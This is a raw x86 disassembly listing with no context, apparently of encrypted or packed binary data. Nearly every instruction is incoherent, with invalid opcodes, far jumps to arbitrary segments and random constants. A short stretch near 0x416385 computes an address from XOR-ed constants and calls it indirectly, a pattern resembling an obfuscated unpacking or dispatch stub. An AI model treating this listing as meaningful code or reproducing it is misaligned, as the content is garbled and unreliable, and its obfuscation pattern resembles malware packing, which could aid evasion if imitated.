  41609d:	retf   0x7f17
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x41608d
  4160a6:	ins    BYTE PTR es:[edi],dx
  4160a7:	pop    esi
  4160a8:	imul   eax
  4160aa:	push   ebp
  4160ab:	pop    ss
  4160ac:	pop    edi
  4160ad:	adc    bl,BYTE PTR [ebx+eax*1+0x7ab09b48]
  4160b4:	test   DWORD PTR ds:0x83ed22bf,esi
  4160ba:	xchg   ebp,eax
  4160bb:	arpl   WORD PTR [eax+0xd],sp
  4160be:	inc    ebx
  4160bf:	out    dx,al
  4160c0:	stos   BYTE PTR es:[edi],al
  4160c1:	das    
  4160c2:	xor    ecx,ecx
  4160c4:	sub    al,0x25
  4160c6:	pop    esp
  4160c7:	dec    ebx
  4160c8:	out    dx,eax
  4160c9:	stos   BYTE PTR es:[edi],al
  4160ca:	sub    eax,DWORD PTR [edx+0x29b2d7fb]
  4160d0:	ror    bl,1
  4160d2:	cmp    esp,edi
  4160d4:	jg     0x4160a0
  4160d6:	push   edx
  4160d7:	pop    ebp
  4160d8:	push   esi
  4160d9:	push   esp
  4160da:	inc    eax
  4160db:	xchg   esi,eax
  4160dc:	das    
  4160dd:	jae    0x4160b4
  4160df:	call   0x4bdcc93
  4160e4:	cmc    
  4160e5:	dec    esi
  4160e6:	bound  ecx,QWORD PTR [ebp-0x4f]
  4160e9:	cmp    eax,0x3fc6a4a0
  4160ee:	bound  eax,QWORD PTR [edi-0x42ee0e0]
  4160f4:	lods   eax,DWORD PTR ds:[esi]
  4160f5:	bound  esp,QWORD PTR [eax+edx*2+0x3a]
  4160f9:	jne    0x41616f
  4160fb:	test   DWORD PTR [esi+0x5d],ebx
  4160fe:	popa   
  4160ff:	ins    DWORD PTR es:[edi],dx
  416100:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416101:	cmp    eax,0xa873763e
  416106:	mov    edx,0x92f419e5
  41610b:	hlt    
  41610c:	sbb    eax,0x3de00851
  416111:	jg     0x41610d
  416113:	pop    ebp
  416114:	dec    esp
  416115:	jo     0x41612a
  416117:	imul   BYTE PTR [ebp+0x5]
  41611a:	cmp    esi,DWORD PTR [esi+0x3eae2129]
  416120:	dec    esp
  416121:	gs iret 
  416123:	(bad)  
  416124:	jmp    0x78dff67c
  416129:	xor    eax,0x887d8a33
  41612e:	mov    ds:0xde882122,eax
  416133:	xor    edx,DWORD PTR [eax]
  416135:	imul   ebp,ecx,0x1bcb302a
  41613b:	mov    esi,DWORD PTR [edx]
  41613d:	or     DWORD PTR [eax-0x2d2da356],eax
  416143:	jnp    0x416113
  416145:	fnstenv [edi]
  416147:	inc    esi
  416148:	retf   
  416149:	pusha  
  41614a:	out    dx,al
  41614b:	sub    DWORD PTR [edi-0x78],ebx
  41614e:	ret    0x1262
  416151:	cmp    bh,al
  416153:	adc    al,0xcc
  416155:	shl    esp,1
  416157:	and    eax,0x42cfd16d
  41615c:	iret   
  41615d:	and    ebx,eax
  41615f:	fild   DWORD PTR ds:0x57150347
  416165:	mov    BYTE PTR [edx-0x12cbc3c9],bh
  41616b:	popf   
  41616c:	inc    ebx
  41616d:	mov    DWORD PTR [ebx+0x61c4809e],0x86a7b8b4
  416177:	aas    
  416178:	pop    ss
  416179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41617a:	lods   al,BYTE PTR ds:[esi]
  41617b:	aam    0x69
  41617d:	inc    ecx
  41617e:	sub    esp,DWORD PTR [edx]
  416180:	pop    ecx
  416181:	jmp    0x93cb:0x2706b83f
  416188:	call   0xf0c0:0x2e2b1daa
  41618f:	ud1    eax,DWORD PTR [ebp-0x3a]
  416193:	pop    ebx
  416194:	into   
  416195:	(bad)  
  416196:	dec    edi
  416197:	popf   
  416198:	fimul  WORD PTR [edi-0x11]
  41619b:	pop    esp
  41619c:	hlt    
  41619d:	jnp    0x4161b2
  41619f:	mov    ecx,0x2ffcc526
  4161a4:	push   eax
  4161a5:	int3   
  4161a6:	jbe    0x416152
  4161a8:	cmp    DWORD PTR [ebx],0x66
  4161ab:	leave  
  4161ac:	mov    ?,edi
  4161ae:	xchg   edi,eax
  4161af:	rol    BYTE PTR [esi+esi*2],cl
  4161b2:	ret    0xcb40
  4161b5:	mov    ah,0x86
  4161b7:	add    eax,0x26899f19
  4161bc:	push   ebp
  4161bd:	dec    ecx
  4161be:	sub    BYTE PTR [eax-0xd],bh
  4161c1:	mov    es,WORD PTR [edi*2-0x1431773d]
  4161c8:	xor    esp,DWORD PTR [edi]
  4161ca:	jge    0x4161e2
  4161cc:	adc    edi,DWORD PTR [edi-0x59]
  4161cf:	push   esp
  4161d0:	mov    bh,0x3c
  4161d2:	dec    ecx
  4161d3:	adc    BYTE PTR [esp+ecx*1],cl
  4161d6:	mov    DWORD PTR [eax+0x619b3a45],edx
  4161dc:	fld    DWORD PTR [esi]
  4161de:	mov    eax,ds:0x2c613a53
  4161e3:	add    eax,0xb0589b62
  4161e8:	ret    0xe58
  4161eb:	les    ebp,FWORD PTR [ebp+0x4fc9fe24]
  4161f1:	fsubr  DWORD PTR [ebp+0x1b]
  4161f4:	dec    ebp
  4161f5:	mov    BYTE PTR [edi+0x58],dh
  4161f8:	xor    DWORD PTR [edx+0x38d33272],edx
  4161fe:	xchg   ebp,eax
  4161ff:	xor    al,BYTE PTR [ebx+0x5d]
  416202:	jmp    0x7103:0xee975d4e
  416209:	loopne 0x4161a4
  41620b:	sub    DWORD PTR [edx],ecx
  41620d:	mov    esi,0xb40f7d2d
  416212:	mov    edi,0x16f6aaf6
  416217:	loop   0x416273
  416219:	push   esp
  41621a:	pop    ds
  41621b:	push   cs
  41621c:	push   es
  41621d:	sahf   
  41621e:	push   ss
  41621f:	mov    WORD PTR [eax],fs
  416221:	int3   
  416222:	fisttp WORD PTR [esp+ecx*8-0x4b]
  416226:	inc    edi
  416227:	cdq    
  416228:	or     ch,dl
  41622a:	dec    ecx
  41622b:	sub    eax,DWORD PTR [edx+ebp*2]
  41622e:	xchg   esi,eax
  41622f:	xchg   edi,eax
  416230:	dec    BYTE PTR [ebx-0x26057daa]
  416236:	xor    al,0x5c
  416238:	dec    eax
  416239:	dec    esi
  41623a:	mov    ?,ecx
  41623c:	jo     0x41628f
  41623e:	pop    ds
  41623f:	retf   0x837
  416242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416243:	sar    BYTE PTR [esi+ecx*4+0x4cf25d83],0xf
  41624b:	sbb    dl,BYTE PTR [edx+0x4c5cb4ea]
  416251:	push   ebp
  416252:	aam    0x13
  416254:	enter  0x820,0x10
  416258:	bound  esi,QWORD PTR [edx-0x3f]
  41625b:	scas   eax,DWORD PTR es:[edi]
  41625c:	test   BYTE PTR ds:[esi+0x25],bl
  416260:	pop    ebx
  416261:	push   edx
  416262:	push   ds
  416263:	sbb    esp,esp
  416265:	popf   
  416266:	scas   eax,DWORD PTR es:[edi]
  416267:	cmp    DWORD PTR [esi-0x5],eax
  41626a:	aas    
  41626b:	mov    eax,ds:0xe6ea86f4
  416270:	sbb    DWORD PTR ds:[edi-0x1a6d965e],esi
  416277:	clc    
  416278:	sti    
  416279:	sbb    esi,DWORD PTR [ebx-0x61]
  41627c:	popa   
  41627d:	jmp    0xfb3ed427
  416282:	mul    eax
  416284:	inc    ebp
  416285:	adc    DWORD PTR [eax],ecx
  416287:	add    eax,0x7a0ab4a9
  41628c:	jmp    0x416240
  41628e:	data16 (bad) 
  416290:	loop   0x416247
  416292:	shl    BYTE PTR [ebp-0x5b],1
  416295:	les    edi,FWORD PTR [ebx]
  416297:	push   0xffffffb1
  416299:	gs int3 
  41629b:	push   edi
  41629c:	cmp    ch,ch
  41629e:	outs   dx,BYTE PTR ds:[esi]
  41629f:	dec    edi
  4162a0:	cmp    DWORD PTR [ebx-0x4a62fe95],ecx
  4162a6:	mov    al,0xa5
  4162a8:	jae    0x41624e
  4162aa:	adc    DWORD PTR [ebp+0x2c9ec6eb],esi
  4162b0:	gs push 0x5c
  4162b3:	adc    al,cl
  4162b5:	push   ss
  4162b6:	gs hlt 
  4162b8:	inc    ebp
  4162b9:	inc    edi
  4162ba:	mov    esp,0x36dc8823
  4162bf:	popa   
  4162c0:	imul   eax,DWORD PTR [ebp+0x4d],0x67b7dc2e
  4162c7:	loop   0x416266
  4162c9:	push   edi
  4162ca:	push   es
  4162cb:	repnz movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  4162ce:	icebp  
  4162cf:	ja     0x4162aa
  4162d1:	inc    esp
  4162d2:	(bad)  
  4162d3:	popf   
  4162d4:	mov    ds:0x8121096f,eax
  4162d9:	idiv   DWORD PTR [ebp-0x48]
  4162dc:	sub    dh,dh
  4162de:	or     ah,cl
  4162e0:	pushf  
  4162e1:	xchg   esp,eax
  4162e2:	in     al,dx
  4162e3:	retf   0xaea0
  4162e6:	in     al,0x8f
  4162e8:	adc    eax,0xbcdd6830
  4162ed:	xor    edi,DWORD PTR ds:0xf160a088
  4162f3:	leave  
  4162f4:	imul   ebx,DWORD PTR [edx-0x3a],0xfffffff5
  4162f8:	je     0x416371
  4162fa:	int    0xf4
  4162fc:	cli    
  4162fd:	xchg   eax,eax
  4162ff:	jecxz  0x416360
  416301:	fstp   TBYTE PTR [ebx+0x4f79b8dc]
  416307:	mov    bl,0xb8
  416309:	ss pop eax
  41630b:	and    al,0x74
  41630d:	rcr    edi,cl
  41630f:	or     ch,BYTE PTR [edi-0xa45d224]
  416315:	in     eax,0x97
  416317:	int3   
  416318:	fcomp  QWORD PTR [ebp-0x1af505eb]
  41631e:	nop
  41631f:	and    dl,BYTE PTR [ebx-0xa]
  416322:	inc    edi
  416323:	adc    eax,0xb0d2820a
  416328:	sbb    BYTE PTR [ebx],dh
  41632a:	fimul  DWORD PTR [eax+esi*1-0x76d15dc6]
  416331:	call   DWORD PTR [eax+0x29]
  416334:	aam    0xc4
  416336:	inc    edx
  416337:	or     al,0xa7
  416339:	fadd   st,st(4)
  41633b:	mov    ecx,0x2cc2f40f
  416340:	fcomp  st(6)
  416342:	and    ebp,DWORD PTR [esp+edi*8+0x6a4386c8]
  416349:	jle    0x41632f
  41634b:	mov    DWORD PTR [ecx+0x46],esp
  41634e:	sub    DWORD PTR [eax+0x6d280f8b],0xffffff9a
  416355:	sub    BYTE PTR [esp+esi*8-0x1c],ah
  416359:	sbb    BYTE PTR [esi],ah
  41635b:	retf   0x34d0
  41635e:	xchg   BYTE PTR [esi*8+0x41032e1b],bl
  416365:	jg     0x4162f5
  416367:	loope  0x4163da
  416369:	push   esi
  41636a:	popf   
  41636b:	mov    esi,0x8d084d8b
  416370:	mov    WORD PTR [edx],cs
  416372:	pushf  
  416373:	jb     0x4163a7
  416375:	add    BYTE PTR [ebx],bh
  416377:	enter  0x850f,0x22
  41637b:	icebp  
  41637c:	(bad)  
  41637d:	dec    DWORD PTR [ebx+0x5e9de]
  416383:	add    BYTE PTR [eax],al
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0xd816c841
  4163bf:	loopne 0x416369
  4163c1:	adc    edx,DWORD PTR [edi+edi*2]
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x416411
  4163ca:	cmp    cl,ah
  4163cc:	jle    0x416436
  4163ce:	jno    0x4163b1
  4163d0:	jae    0x4163a3
  4163d2:	xor    dl,ch
  4163d4:	push   edi
  4163d5:	cs jb  0x416404
  4163d8:	push   ds
  4163d9:	pop    esi
  4163da:	sbb    esp,ebp
  4163dc:	jp     0x4163cf
  4163de:	lods   al,BYTE PTR ds:[esi]
  4163df:	repz fld DWORD PTR [esi+0x7d]
  4163e3:	mov    esi,0x508e68ad
  4163e8:	aam    0x6
  4163ea:	cmp    BYTE PTR [ebp+0x830eb76],dl
  4163f0:	add    esi,DWORD PTR [ecx-0x41f06829]
  4163f6:	ins    BYTE PTR es:[edi],dx
  4163f7:	call   0xdc533e60
  4163fc:	jge    0x41642d
  4163fe:	push   eax
  4163ff:	or     al,0xd1
  416401:	test   al,0xdc
  416403:	outs   dx,BYTE PTR ds:[esi]
  416404:	mov    eax,ds:0xf8bac8ef
  416409:	push   edi
  41640a:	dec    BYTE PTR [esi-0x316d0c12]
  416410:	xchg   esi,eax
  416411:	fsubr  QWORD PTR [edi-0x2d18f177]
  416417:	push   DWORD PTR [ebx+0x21]
  41641a:	fs loope 0x41643f
  41641d:	loopne 0x41643b
  41641f:	inc    esp
  416420:	shl    DWORD PTR [ecx+edi*4+0x182c07b5],1
  416427:	popf   
  416428:	dec    esp
  416429:	xchg   ecx,eax
  41642a:	xchg   ebp,eax
  41642b:	pusha  
  41642c:	es push esp
  41642e:	push   ecx
  41642f:	pop    edx
  416430:	xor    esi,DWORD PTR [edx]
  416432:	(bad)  
  416433:	enter  0xe822,0xa3
  416437:	test   al,0xc7
  416439:	test   eax,0xf28132de
  41643e:	adc    al,0x3
  416440:	fimul  WORD PTR [edi+0x3]
  416443:	and    ecx,0xe6284a3c
  416449:	mov    BYTE PTR [edi+0x2],dh
  41644c:	xchg   edi,eax
  41644d:	jg     0x416477
  41644f:	xchg   edx,eax
  416450:	mov    bl,0x64
  416452:	mov    ebp,0xf649761e
  416457:	(bad)  
  416458:	mov    ebp,DWORD PTR [esi+0x53]
  41645b:	adc    BYTE PTR [edx+0x1d],al
  41645e:	adc    esp,DWORD PTR [eax]
  416460:	mov    WORD PTR [esi+0xb408348],?
  416466:	(bad)  
  416467:	mov    edx,0xcc507eb3
  41646c:	imul   edx,DWORD PTR [ebx],0xab3f8c98
  416472:	jb     0x416467
  416474:	push   edx
  416475:	fsub   QWORD PTR [esi]
  416477:	lock aaa 
  416479:	push   ebp
  41647a:	(bad)  
  41647b:	pop    ecx
  41647c:	pop    eax
  41647d:	lods   al,BYTE PTR ds:[esi]
  41647e:	repnz out dx,eax
  416480:	pop    ebx
  416481:	(bad)  
  416482:	pop    ebx
  416483:	mov    al,0x9e
  416485:	shr    DWORD PTR [edi+0x4fa1722a],1
  41648b:	fwait
  41648c:	sbb    BYTE PTR [ecx+0x60a1aac0],cl
  416492:	inc    ebp
  416493:	or     ch,cl
  416495:	loopne 0x416422
  416497:	bound  edx,QWORD PTR [eax+0x42]
  41649a:	mov    WORD PTR [esi-0x65],fs
  41649d:	xchg   ebx,edx
  41649f:	sbb    BYTE PTR [ebx-0x6a],ah
  4164a2:	or     eax,0x1249027b
  4164a7:	jp     0x4164e9
  4164a9:	and    bl,BYTE PTR [ebp-0x45]
  4164ac:	and    DWORD PTR [esi],ebx
  4164ae:	jb     0x41647c
  4164b0:	enter  0x7576,0xe0
  4164b4:	(bad)  
  4164b5:	pop    ds
  4164b6:	imul   ecx,DWORD PTR [edx+0x72],0x40
  4164ba:	fidivr DWORD PTR [eax+eiz*8]
  4164bd:	mov    ecx,0xff6a4c36
  4164c2:	dec    edx
  4164c3:	fisub  WORD PTR [edi-0x1b36da11]
  4164c9:	jle    0x4164aa
  4164cb:	gs test al,0x76
  4164ce:	and    eax,0xc9526512
  4164d3:	shr    BYTE PTR [ebx+0x7d],cl
  4164d6:	out    dx,al
  4164d7:	repnz aas 
  4164d9:	sub    edx,0x4b531143
  4164df:	cmp    eax,0xe95a9e6a
  4164e4:	shl    BYTE PTR [eax-0x24af0a17],cl
  4164ea:	xchg   ebx,eax
  4164eb:	sub    BYTE PTR [ebx-0x391d06a5],bh
  4164f1:	sub    al,0xbe
  4164f3:	pop    ecx
  4164f4:	xor    DWORD PTR [edx-0x7f],edi
  4164f7:	repnz mov eax,ds:0xa263365e
  4164fd:	(bad)  
  4164ff:	(bad)  
  416500:	or     ebx,DWORD PTR [ebx-0x47b15ef2]
  416506:	loope  0x41653b
  416508:	push   cs
  416509:	out    0xa4,al
  41650b:	sub    DWORD PTR [edx-0x1d33545b],0xb17e68d2
  416515:	lods   eax,DWORD PTR ds:[esi]
  416516:	jle    0x4164e5
  416518:	pop    eax
  416519:	dec    ecx
  41651a:	data16 mov dl,0x39
  41651d:	inc    ebp
  41651e:	sbb    bh,al
  416520:	outs   dx,DWORD PTR ds:[esi]
  416521:	sbb    DWORD PTR [ecx+0x63],eax
  416524:	aas    
  416525:	sbb    ah,bh
  416527:	mov    cl,0x6
  416529:	sti    
  41652a:	mov    esi,0x7ebcb828
  41652f:	leave  
  416530:	push   esi
  416531:	mov    ebx,0xe4269eba
  416536:	lahf   
  416537:	fs (bad) 
  416539:	fdiv   QWORD PTR [edx]
  41653b:	mov    ds:0x548aca8c,eax
  416540:	jmp    0x416529
  416542:	stos   DWORD PTR es:[edi],eax
  416543:	cmp    al,0x95
  416545:	cmp    BYTE PTR [ecx+0x4c],cl
  416548:	pop    esi
  416549:	pop    eax
  41654a:	xchg   edx,eax
  41654b:	push   0x753b5cdc
  416550:	push   ds
  416551:	test   DWORD PTR [ebx],0x3b65a0e8
  416557:	pop    es
  416558:	rol    BYTE PTR ds:0x6cfcdcde,1
  41655e:	adc    BYTE PTR [esi-0x42],0x91
  416562:	(bad)  [ebp+0x5e54ebf5]
  416568:	lock add esi,DWORD PTR [edi-0x21776809]
  41656f:	inc    ecx
  416570:	xchg   BYTE PTR [eax-0x32202ba5],dl
  416576:	mov    eax,0xa06a9a86
  41657b:	shl    ebx,cl
  41657d:	fldenv [esi-0x5d]
  416580:	int3   
  416581:	push   0xfffffff5
  416583:	jns    0x4165f4
  416585:	dec    edx
  416586:	add    eax,0xf1b09866
  41658b:	inc    ebp
  41658c:	dec    edi
  41658d:	imul   esp,DWORD PTR [eax],0x31389ca
  416593:	xor    eax,0x267fbde3
  416598:	cmp    eax,0x13e6848c
  41659d:	mov    al,ds:0x5e6ce452
  4165a2:	pusha  
  4165a3:	mov    ah,0xad
  4165a5:	sbb    eax,0xde8dd0ce
  4165aa:	dec    ebx
  4165ab:	enter  0x352e,0xb3
  4165af:	cmp    dh,BYTE PTR [edx]
  4165b1:	pop    eax
  4165b2:	jmp    0x4165a5
  4165b4:	push   0x8df892cc
  4165b9:	or     al,0xcb
  4165bb:	(bad)  
  4165bc:	sbb    eax,0x4400db42
  4165c1:	sbb    BYTE PTR [ebp-0x486b12ae],al
  4165c7:	stos   DWORD PTR es:[edi],eax
  4165c8:	div    DWORD PTR [esi]
  4165ca:	jae    0x4165c0
  4165cc:	adc    BYTE PTR [eax+0x1e],cl
  4165cf:	add    BYTE PTR [esi],dl
  4165d1:	fbld   TBYTE PTR [ecx+0x1dacd1b4]
  4165d7:	out    0xed,eax
  4165d9:	dec    esi
  4165da:	test   eax,0x7bc6acc3
  4165df:	(bad)  
  4165e0:	adc    eax,0xa376d89e
  4165e5:	adc    eax,0x6954de4e
  4165ea:	aam    0xd6
  4165ec:	add    al,0x38
  4165ee:	dec    ebx
  4165ef:	test   bh,bh
  4165f1:	sar    eax,1
  4165f3:	pop    es
  4165f4:	jae    0x4165fc
  4165f6:	out    dx,al
  4165f7:	mov    esi,0xa8f014c4
  4165fc:	test   edx,ebx
  4165fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165ff:	cwde   
  416600:	clc    
  416601:	icebp  
  416602:	shr    edx,0x45
  416605:	test   DWORD PTR [esi-0x7796fe05],ecx
  41660b:	shl    BYTE PTR [eax+0x303a5823],cl
  416611:	sub    DWORD PTR [edx-0x3c46cbd3],edx
  416617:	or     DWORD PTR ds:0x7435d09f,esp
  41661d:	rcr    eax,cl
  41661f:	test   dl,al
  416621:	lods   al,BYTE PTR ds:[esi]
  416622:	push   esi
  416623:	shr    esp,0x4a
  416626:	icebp  
  416627:	ja     0x416602
  416629:	xor    al,0x19
  41662b:	adc    DWORD PTR [ecx],edx
  41662d:	rcr    BYTE PTR [ebx-0x70111f0b],0x2c
  416634:	sub    DWORD PTR [edi-0x3c],esi
  416637:	je     0x416667
  416639:	push   ecx
  41663a:	ja     0x4165bc
  41663c:	jo     0x7db3f4db
  416642:	mov    eax,ds:0x9ed5dc50
  416647:	xor    al,0xe1
  416649:	push   ecx
  41664a:	leave  
  41664b:	shr    edx,1
  41664d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41664e:	loop   0x416615
  416650:	pushf  
  416651:	psubsw mm4,QWORD PTR [edi+0x34]
  416655:	fs gs pop edx
  416658:	out    dx,al
  416659:	xor    DWORD PTR [ebp+0x7f],0xffffff8a
  41665d:	adc    BYTE PTR [ebx-0x31828ffb],dh
  416663:	fisttp QWORD PTR [ecx+0x7f0e9784]
  416669:	test   al,0x40
  41666b:	jbe    0x416678
  41666d:	pop    ds
  41666e:	mov    esi,DWORD PTR [edx+0xc]
  416671:	mov    ?,esp
  416673:	sar    ecx,0xc3
  416676:	mov    esp,0x3baac8f0
  41667b:	mov    dh,0x42
  41667d:	ja     0x416677
  41667f:	or     esi,DWORD PTR [edi-0x16236ad]
  416685:	sub    BYTE PTR [ecx-0x4d14f833],ah
  41668b:	mov    bl,0x1a
  41668d:	inc    eax
  41668e:	fild   DWORD PTR [ecx]
  416690:	xchg   edx,eax
  416691:	push   0xa
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416727
  4166ae:	sub    edi,eax
  4166b0:	aad    0x5c
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0xc870707e
  4166ba:	mov    eax,0xf33ca932
  4166bf:	inc    edx
  4166c0:	xchg   esi,eax
  4166c1:	jno    0x416670
  4166c3:	(bad)  
  4166c7:	inc    edx
  4166c8:	push   cs
  4166c9:	jge    0x416688
  4166cb:	outs   dx,DWORD PTR ds:[esi]
  4166cc:	retf   
  4166cd:	ins    BYTE PTR es:[edi],dx
  4166ce:	xchg   esp,eax
  4166cf:	pusha  
  4166d0:	xlat   BYTE PTR ds:[ebx]
  4166d1:	sbb    eax,0x9e0e7abf
  4166d6:	mov    ah,0xf0
  4166d8:	test   bl,0x95
  4166db:	inc    esp
  4166dc:	test   edx,0xd35a50e7
  4166e2:	dec    ecx
  4166e3:	adc    ah,BYTE PTR [ecx]
  4166e5:	retf   0x6c2e
  4166e8:	(bad)  
  4166e9:	mov    cl,0x59
  4166eb:	cdq    
  4166ec:	fstp   DWORD PTR [esi+0x3e]
  4166ef:	shl    BYTE PTR [ecx-0x4ff31e7e],0x85
  4166f6:	ret    0x5c1d
  4166f9:	fsub   QWORD PTR [edi+0x5a94144b]
  4166ff:	inc    ebx
  416700:	xchg   esp,eax
  416701:	lock mov ch,0x15
  416704:	rol    BYTE PTR ds:[eax],cl
  416707:	jle    0x41672b
  416709:	loopne 0x4166b1
  41670b:	jp     0x416763
  41670d:	inc    esi
  41670e:	and    eax,0x13129af9
  416713:	cli    
  416714:	cmc    
  416715:	lds    ebp,FWORD PTR [edx+0x30284db1]
  41671b:	pop    ss
  41671c:	add    bh,BYTE PTR [edi-0x39001697]
  416722:	aaa    
  416723:	xchg   edx,eax
  416724:	imul   esi,DWORD PTR [ecx+0x6d],0x6c
  416728:	xchg   esi,eax
  416729:	addr16 mov ebp,0xaf3bf0e9
  41672f:	push   cs
  416730:	mov    ds:0x73340fb8,al
  416735:	loop   0x416737
  416737:	ss xchg esi,eax
  416739:	jmp    0xd104:0x4eb4518d
  416740:	jmp    0xc06f17a1
  416745:	sub    ah,BYTE PTR [ecx]
  416747:	sbb    eax,0xbda1e1e1
  41674c:	outs   dx,BYTE PTR ds:[esi]
  41674d:	not    al
  41674f:	sub    al,0x47
  416751:	fcomp  QWORD PTR [ecx+0x14baaada]
  416757:	adc    eax,0x4ae5a48b
  41675c:	and    ch,BYTE PTR ds:0xb8f79e9c
  416762:	push   0xffffffb3
  416764:	mov    esp,0xe52bf8bf
  416769:	xchg   DWORD PTR [ebp+0x6d],eax
  41676c:	xchg   esi,eax
  41676d:	or     al,0xf6
  41676f:	(bad)  
  416770:	xor    BYTE PTR [ebx+0x443231a7],bh
  416776:	call   DWORD PTR [edx]
  416778:	into   
  416779:	jne    0x41675b
  41677b:	inc    edi
  41677c:	sbb    al,BYTE PTR [ecx]
  41677e:	out    0xb0,al
  416780:	test   al,0xd5
  416782:	pushf  
  416783:	jmp    0x1b4d47ee
  416788:	jo     0x41677f
  41678a:	test   DWORD PTR [ebx-0x5a],esp
  41678d:	xor    eax,DWORD PTR [ebx]
  41678f:	fisub  WORD PTR [ebp+0x5]
  416792:	sub    eax,DWORD PTR [ecx]
  416794:	pop    esi
  416795:	in     al,0xf4
  416797:	sub    bl,cl
  416799:	popa   
  41679a:	adc    dl,BYTE PTR [esi]
  41679c:	iret   
  41679d:	mov    ah,0x74
  41679f:	mov    al,0x6c
  4167a1:	pop    esp
  4167a2:	or     eax,0x519306fd
  4167a7:	xchg   edx,eax
  4167a8:	cmp    BYTE PTR [ebx+edi*4],dl
  4167ab:	in     eax,0xc6
  4167ad:	sar    ebp,1
  4167af:	sub    eax,0x4bada725
  4167b4:	(bad)  
  4167b5:	mov    WORD PTR [edx+0x5a3fcf6a],cs
  4167bb:	push   ebp
  4167bc:	add    BYTE PTR [edi],bl
  4167be:	icebp  
  4167bf:	add    esp,DWORD PTR [ebx-0x4e1249da]
  4167c5:	fs out dx,eax
  4167c7:	fwait
  4167c8:	data16 stc 
  4167ca:	mov    dh,BYTE PTR [ebp-0xa19703c]
  4167d0:	sbb    BYTE PTR [esi+0x1c01dfc5],bh
  4167d6:	imul   esi,DWORD PTR ds:[edx+ebp*8+0x739e7894],0x62
  4167df:	aaa    
  4167e0:	shl    DWORD PTR [ebx-0x1c529593],0x68
  4167e7:	jae    0x41676e
  4167e9:	popf   
  4167ea:	push   ss
  4167eb:	jmp    0x4167e8
  4167ed:	out    0x34,eax
  4167ef:	(bad)  
  4167f0:	rcl    bh,0xe3
  4167f3:	pushf  
  4167f4:	mov    ds:0xd61af63,al
  4167f9:	sbb    edx,ebx
  4167fb:	adc    DWORD PTR [ebx+ecx*8-0x492062f8],0x18
  416803:	adc    eax,0x39d9c7b1
  416808:	dec    esp
  416809:	and    eax,edx
  41680b:	sbb    al,0x67
  41680d:	aaa    
  41680e:	add    DWORD PTR [eax+edx*1-0x727c8e50],esp
  416815:	bound  edx,QWORD PTR [eax]
  416817:	and    edx,DWORD PTR ds:0x63287441
  41681d:	(bad)  
  41681e:	sbb    BYTE PTR [ebp+edi*4+0x4bc9cf8c],bh
  416825:	out    dx,eax
  416826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416827:	arpl   WORD PTR [eax],bp
  416829:	mov    al,0x11
  41682b:	imul   esp,ecx,0xf9df00fa
  416831:	nop
  416832:	sub    DWORD PTR [ebx+0x59a4cfa5],ebp
  416838:	and    esi,DWORD PTR [eax-0x39]
  41683b:	mov    dl,0x4e
  41683d:	dec    edx
  41683e:	aam    0x6a
  416840:	mov    ecx,0xfe68d8f2
  416845:	arpl   bx,bx
  416847:	push   ecx
  416848:	add    ebp,DWORD PTR [ebx+0x3f875e74]
  41684e:	sar    esp,1
  416850:	cmc    
  416851:	div    BYTE PTR [edi]
  416853:	xchg   esp,eax
  416854:	sub    BYTE PTR [ebx+0x55bad86a],dl
  41685a:	pop    es
  41685b:	jge    0x41680a
  41685d:	push   eax
  41685e:	imul   esi,DWORD PTR [eax+0x67604ec3],0xffffff86
  416865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416866:	scas   al,BYTE PTR es:[edi]
  416867:	mov    eax,DWORD PTR [edx]
  416869:	cld    
  41686a:	xchg   ebx,eax
  41686b:	pop    ss
  41686c:	inc    esp
  41686d:	push   0x7b
  41686f:	dec    esi
  416870:	(bad)  
  416871:	pop    ss
  416872:	lea    ebx,[edi+0x3a3a83b6]
  416878:	dec    edx
  416879:	fistp  DWORD PTR [esi-0x1d]
  41687c:	cmp    ch,BYTE PTR [ebp-0x7d5f539d]
  416882:	sub    BYTE PTR [ebx-0x78],0xbb
  416886:	jmp    0x4168b4
  416888:	in     eax,0xc4
  41688a:	push   ss
  41688b:	fsubrp st(6),st
  41688d:	mov    dh,0x8e
  41688f:	ins    BYTE PTR es:[edi],dx
  416890:	ins    DWORD PTR es:[edi],dx
  416891:	jmp    0x416871
  416893:	xor    eax,0xe62468d0
  416898:	jo     0x41685f
  41689a:	push   esp
  41689b:	mov    es,WORD PTR [edi]
  41689d:	test   eax,0xd32d454a
  4168a2:	adc    al,0x6d
  4168a4:	sub    DWORD PTR [esi],ebx
  4168a6:	jp     0x416872
  4168a8:	add    BYTE PTR [ecx-0x4d],cl
  4168ab:	add    DWORD PTR [ecx-0x1d],ebx
  4168ae:	pop    esp
  4168af:	enter  0x671f,0x3
  4168b3:	or     bh,BYTE PTR [ebx+0x2e8909f]
  4168b9:	daa    
  4168ba:	test   ebx,ebp
  4168bc:	adc    ah,BYTE PTR [ecx]
  4168be:	(bad)  
